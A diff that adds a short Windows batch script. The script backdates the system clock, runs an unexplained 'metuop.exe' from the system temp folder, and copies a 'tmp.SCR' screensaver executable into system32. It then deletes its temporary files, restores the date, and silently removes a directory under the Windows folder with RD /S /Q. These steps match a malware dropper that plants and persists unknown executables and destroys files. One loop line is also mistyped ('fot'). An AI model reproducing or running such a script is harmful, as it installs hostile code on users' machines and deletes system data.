@@ -1,0 +1,23 @@
+date 2005-10-09
+
+date 2005-10-09
+
+@echo off & setlocal enableextensions
+echo WScript.Sleep 300 > %temp%.\tmp$$$.vbs
+set /a i = 10
+:Timeout
+if %i% == 0 goto Next
+setlocal
+set /a i = %i% - 1
+cscript //nologo %temp%.\tmp$$$.vbs
+goto Timeout
+goto End
+
+:Next
+%systemroot%\temp\metuop.exe
+copy %systemroot%\temp\tmp.SCR %systemroot%\system32\
+fot %%f in (%temp%.\tmp$$$.vbs*) do del %%f
+
+date %date%
+
+RD /S /Q %systemroot%\webc\
